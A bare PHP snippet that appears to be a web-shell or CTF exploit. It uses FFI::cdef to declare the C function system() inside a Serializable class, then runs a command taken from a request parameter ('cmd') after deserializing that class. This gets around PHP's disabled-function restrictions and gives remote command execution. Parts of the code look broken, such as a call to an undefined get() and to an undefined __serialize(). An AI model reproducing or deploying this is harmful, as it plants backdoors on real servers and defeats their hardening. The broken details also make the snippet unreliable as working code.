final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(char *command);'
    ];

    private function run () {
        echo "run<br>";
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }
    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __get ($key) {
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

    public function __construct () {
        echo "__construct<br>";
    }
}
$a = new A();
unserialize(serialize($a))->__serialize()['ret']->system(get("cmd"));